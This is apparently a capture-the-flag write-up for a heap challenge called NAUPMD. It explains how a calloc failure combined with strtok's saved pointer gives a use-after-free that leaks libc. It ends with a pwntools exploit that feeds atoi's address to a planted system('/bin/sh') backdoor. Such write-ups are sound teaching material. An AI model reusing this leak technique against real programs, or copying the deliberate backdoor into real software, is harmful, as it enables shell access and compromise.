# NAUPMD v0.0.0 📒📕📘	
> Author: 堇姬 Naup

## Analyze
It has four functions.
- create note
- delete note
- show note
- backdoor

```c
        choice = read_choice();
        
        if(choice == 1) {
            CREATE_NOTE();
        } else if (choice == 2) {
            DELETE_NOTE();
        } else if (choice == 3) {
            SHOW_NOTES(); 
        } else if (choice == 4) {
            BACKDOOR();  
```

We first analyze delete note
```c
void DELETE_NOTE() {
    int index;
    printf("Index > ");
    scanf("%d", &index);

    if (index < 0 || index >= NOTE_ARR || NOTE_ARRAY[index] == NULL) {
        puts("[!] Invalid note index.");
        exit(0);
    } else {
        free(NOTE_ARRAY[index]);
        NOTE_ARRAY[index] = NULL;
        printf("Note[%d] deleted successfully.\n", index);
    }
}
```
We can input index , and it will check index and note array
If it have allocated, we can free this chunk.
And then it will clear note array pointer.
So this part didn't have UAF or etc vuln.

```c
void SHOW_NOTES() {
    int DEBUG = 0;
    if (DEBUG){
        puts("==== NOTES ====");
        for (int i = 0; i < NOTE_ARR; i++) {
            if (NOTE_ARRAY[i] != NULL) {
                printf("[%d] Title: %s | Description: %s\n", i, NOTE_ARRAY[i]->title, NOTE_ARRAY[i]->description);
            }
        }
    }
    else {
        puts("I forget to delete debug...Because I go to watch AVE Mujica.");
    }
}
```
Another function is show note.
It need `debug == 1`, so if we don't change this value.
We don't go to use this function.

OK, next let me check backdoor
```c
void BACKDOOR(){
    unsigned long your_input;
    unsigned long admin_password = (unsigned long)&atoi;
    void *ptr = NULL;
    char username[0x60];
    char buffer[0x10];

    flush_stdin();
    puts("Verify...");
    printf("Input username > ");
    scanf("%95s",username);
    
    flush_stdin();
    printf("Input password > ");
    if (scanf("%lu", &your_input) != 1) { 
        puts("[!] Input error ...");
        exit(0);
    }

    if (your_input == admin_password) {
        puts("[!] Hi Naup ... This is system debug backdoor.");
        system("/bin/sh");
    } else {
        puts("[!] BAD Hacker !!!!!");
        exit(0);
    }   
}
```

If we can input correct password, we can get shell.
Its password is `atoi` address.
If we can leak libc, we can get shell.
So this challenge target is leak libc.

Finally, we check this challenge the most important function. `Create note`
```c
void CREATE_NOTE() {
    
    int input_size;
    printf("Size > ");
    scanf("%d", &input_size);
    
    char* titles = (char*)calloc(1, input_size);

    if (input_size && titles){
        flush_stdin();
        printf("Enter titles > ");
        fgets(titles, input_size, stdin);
        titles[strcspn(titles, "\n")] = '\0';
    }
    
    char* token = strtok(titles, ",");
    int index = 0;

    while (token != NULL) {
        if (index >= NOTE_ARR) {
            puts("[!]Your note space is full... please purchase NAUPMD premium");
            break;
        }

        if (NOTE_ARRAY[index] != NULL) {
            index++;
            continue;
        }

        build_note(token, index);
        index++;

        token = strtok(NULL, ",");
    }
    
    free(titles);
}
```
We can input size. It will calloc one chunk.
You can input titles like `aa,bb,cc`
It will build three note(title -> aa ,bb ,cc). It use strok to cut your input. 

And then it let you input 
```c
void build_note(const char* title, int index) {
    
    printf("Description for '%s' > ", title);
    struct NOTE* new_note = (struct NOTE*)malloc(sizeof(struct NOTE));
    if (new_note == NULL) {
        puts("[!]Failed to allocate memory for note.");
        exit(0);
    }

    strncpy(new_note->title, title, sizeof(new_note->title) - 1);
    new_note->title[sizeof(new_note->title) - 1] = '\0';

   
    scanf("%15s", new_note->description);

    NOTE_ARRAY[index] = new_note;
    printf("Note[%d] '%s' created successfully.\n", index, title);
}
```

It will store title to NOTE struct and make you input description.
Its copy and input not have any problem.

## Bug
First, we need to know `calloc` and `strtok`.

Calloc's return value is null when calloc error. (Like you input size == -1)
Let's stop here and go back to see strtok.
It is a cool function in C.
`char *strtok(char *str, const char *delim)`

We can input one string and delim.
According to delim, it will cut string.
```c
#include <string.h>
#include <stdio.h>
 
int main () {
   char str[80] = "MyGO!!!!! - TomorinIsCute - ILoveRana";
   const char s[2] = "-";
   char *token;
   token = strtok(str, s);
   while( token != NULL ) {
      printf( "%s\n", token );
    
      token = strtok(NULL, s);
   }
   
   return(0);
}

// output :
// MyGO!!!!!
//  TomorinIsCute
//  ILoveRana
```
First call strtok need to send string pointer.
But next call strtok, need to send null.
Strtok will cut string which be cut last time.

So go back to read source code.
```c
    printf("Size > ");
    scanf("%d", &input_size);
    
    char* titles = (char*)calloc(1, input_size);
```

First, we input size too big (I use 0x510).
Title's pointer will send to strok.
And then create a note normally. (Notice title need to input 8 byte.)

```c
free(titles);
```

When the end of create_note, it will free this chunk and we have a unsorted bin chunk on heap.
And then calloc again.
But this time we input size == -1.
calloc will return null. (titles will become a null pointer)
So this strtok will become `strtok(null, ",")`
`char* token = strtok(titles, ",");`

It will be based on string which you send the last time .
This string store have been freed.
And this part will print string from unsorted bin chunk (fd and bk have libc address).
```c
void build_note(const char* title, int index) {
    
    printf("Description for '%s' > ", title);
```

Yeah! So we get one UAF! And use it to leak libc.
And caculate atoi's address and call backdoor, we will get shell. 🎉

## exploit
```py
from pwn import *

r=process("./chal")

r.sendlineafter(b"USER @ NAUPMDshell > ", b'1')
r.sendlineafter(b'Size > ',b'1296')

r.sendlineafter(b'Enter titles > ',b'aaaabbbb')
r.sendlineafter(b'> ',b'a')

r.sendlineafter(b"USER @ NAUPMDshell > ", b'1')
r.sendlineafter(b'Size > ',b'-1')

r.recvuntil(b'Description for \'')

leaklibc = u64(r.recv(6).ljust(8,b'\x00'))
libcbase = leaklibc - 0x21ace0

log.success("leaklibc success!")
log.info("leaklibc: "+hex(leaklibc))
log.info("libcbase: "+hex(libcbase))

r.sendlineafter(b'> ',b'a')

password = libcbase + 0x43640 

r.sendlineafter(b"USER @ NAUPMDshell > ", b'4')
r.sendlineafter(b'Input username > ', b'aaaabbbbccccdddd')
r.sendlineafter(b'Input password > ',str(password).encode())

r.interactive()
```



